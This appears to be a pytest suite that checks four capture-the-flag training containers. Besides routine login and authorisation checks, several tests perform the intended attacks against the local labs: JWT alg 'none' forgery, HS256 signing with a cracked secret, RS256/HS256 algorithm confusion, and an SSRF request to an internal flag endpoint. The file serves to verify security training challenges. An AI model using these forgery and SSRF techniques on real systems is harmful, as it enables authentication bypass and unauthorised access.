"""API tests for the four challenge containers. Run with: pytest tests/api -n 4"""

import re

import pytest
import requests

from tests.helpers import (
    ALL_APPS,
    JWT2_SECRET,
    JWT2_USER,
    JWT3_USER,
    JWT_APPS,
    ROOT,
    app_url,
    b64url_json,
    bearer,
    challenge_config,
    forge_hs256,
    forge_none,
    jwt1_guest_creds,
    server_guest_creds,
)

pytestmark = pytest.mark.api

TIMEOUT = 10


def jwt_login_creds(app):
    if app == 'jwt-1':
        return jwt1_guest_creds(app_url(app))
    if app == 'jwt-2':
        return JWT2_USER
    return JWT3_USER


def jwt_login(app):
    user, password = jwt_login_creds(app)
    r = requests.post(
        f'{app_url(app)}/api/{app}/login',
        json={'username': user, 'password': password},
        timeout=TIMEOUT,
    )
    assert r.status_code == 200, r.text
    return r.json()['token']


def flags(app):
    return challenge_config(app)['flags']


@pytest.mark.parametrize('app', ALL_APPS)
def test_health_endpoint(app):
    r = requests.get(f'{app_url(app)}/health', timeout=TIMEOUT)
    assert r.status_code == 200
    assert r.text == 'ok'


@pytest.mark.parametrize('app', JWT_APPS)
def test_login_rejects_wrong_password(app):
    user, _ = jwt_login_creds(app)
    r = requests.post(
        f'{app_url(app)}/api/{app}/login',
        json={'username': user, 'password': 'definitely-wrong'},
        timeout=TIMEOUT,
    )
    assert r.status_code == 401


@pytest.mark.parametrize('app', JWT_APPS)
def test_profile_requires_token(app):
    r = requests.get(f'{app_url(app)}/api/{app}/me', timeout=TIMEOUT)
    assert r.status_code == 401


@pytest.mark.parametrize('app', JWT_APPS)
def test_guest_token_returns_user_flag(app):
    token = jwt_login(app)
    r = requests.get(f'{app_url(app)}/api/{app}/me', headers=bearer(token), timeout=TIMEOUT)
    assert r.status_code == 200
    assert r.json()['role'] == 'user'
    assert r.json()['flag'] == flags(app)[0]


@pytest.mark.parametrize('app', JWT_APPS)
def test_guest_token_is_refused_admin_panel(app):
    token = jwt_login(app)
    r = requests.get(f'{app_url(app)}/api/{app}/admin', headers=bearer(token), timeout=TIMEOUT)
    assert r.status_code == 403
    assert 'FLAG{' not in r.text


def test_jwt1_alg_none_grants_admin_flag():
    app = 'jwt-1'
    user, _ = jwt_login_creds(app)
    token = forge_none({'username': user, 'role': 'admin'})
    r = requests.get(f'{app_url(app)}/api/{app}/admin', headers=bearer(token), timeout=TIMEOUT)
    assert r.status_code == 200
    assert r.json()['flag'] == flags(app)[1]


def test_jwt2_wrong_secret_is_rejected():
    app = 'jwt-2'
    user, _ = JWT2_USER
    token = forge_hs256({'username': user, 'role': 'admin'}, 'not-the-secret')
    r = requests.get(f'{app_url(app)}/api/{app}/admin', headers=bearer(token), timeout=TIMEOUT)
    assert r.status_code == 401


def test_jwt2_cracked_secret_grants_admin_flag():
    app = 'jwt-2'
    user, _ = JWT2_USER
    token = forge_hs256({'username': user, 'role': 'admin'}, JWT2_SECRET)
    r = requests.get(f'{app_url(app)}/api/{app}/admin', headers=bearer(token), timeout=TIMEOUT)
    assert r.status_code == 200
    assert r.json()['flag'] == flags(app)[1]


def test_jwt3_tampered_rs256_token_is_rejected():
    app = 'jwt-3'
    token = jwt_login(app)
    head, _, sig = token.split('.')
    # Re-using the RS256 signature on a changed payload must fail verification.
    tampered = f"{head}.{b64url_json({'username': JWT3_USER[0], 'role': 'admin'})}.{sig}"
    r = requests.get(f'{app_url(app)}/api/{app}/admin', headers=bearer(tampered), timeout=TIMEOUT)
    assert r.status_code == 401


def test_jwt3_public_key_is_exposed_and_matches_token_alg():
    app = 'jwt-3'
    r = requests.get(f'{app_url(app)}/api/{app}/pubkey', timeout=TIMEOUT)
    assert r.status_code == 200
    assert r.text.startswith('-----BEGIN PUBLIC KEY-----')
    token = jwt_login(app)
    assert token.split('.')[0] == b64url_json({'alg': 'RS256', 'typ': 'JWT'})


def test_jwt3_algorithm_confusion_grants_admin_flag():
    app = 'jwt-3'
    public_key = requests.get(f'{app_url(app)}/api/{app}/pubkey', timeout=TIMEOUT).text
    token = forge_hs256({'username': JWT3_USER[0], 'role': 'admin'}, public_key)
    r = requests.get(f'{app_url(app)}/api/{app}/admin', headers=bearer(token), timeout=TIMEOUT)
    assert r.status_code == 200
    assert r.json()['flag'] == flags(app)[1]


def test_jwt3_repository_contains_no_private_key():
    source = (ROOT / 'challenges' / 'jwt-3' / 'build' / 'app.py').read_text()
    assert not re.search(r'-----BEGIN [A-Z ]*PRIVATE KEY-----', source)


def test_server_guest_login_returns_user_flag():
    app = 'server'
    user, password = server_guest_creds(app_url(app))
    r = requests.post(
        f'{app_url(app)}/server/login',
        json={'username': user, 'password': password},
        timeout=TIMEOUT,
    )
    assert r.status_code == 200
    token = r.json()['token']
    me = requests.get(f'{app_url(app)}/server/me', headers=bearer(token), timeout=TIMEOUT)
    assert me.status_code == 200
    assert me.json()['flag_user'] == flags(app)[0]


def test_server_ssrf_reaches_internal_flag():
    app = 'server'
    user, password = server_guest_creds(app_url(app))
    token = requests.post(
        f'{app_url(app)}/server/login',
        json={'username': user, 'password': password},
        timeout=TIMEOUT,
    ).json()['token']
    port = app_url(app).rsplit(':', 1)[1]
    r = requests.post(
        f'{app_url(app)}/server/profile-image',
        json={'url': f'http://127.0.0.1:{port}/internal/flag'},
        headers=bearer(token),
        timeout=TIMEOUT,
    )
    assert r.status_code == 200
    assert flags(app)[1] in r.json()['content']


def test_server_internal_flag_not_readable_from_outside():
    r = requests.get(f"{app_url('server')}/internal/flag", timeout=TIMEOUT)
    assert r.status_code == 403
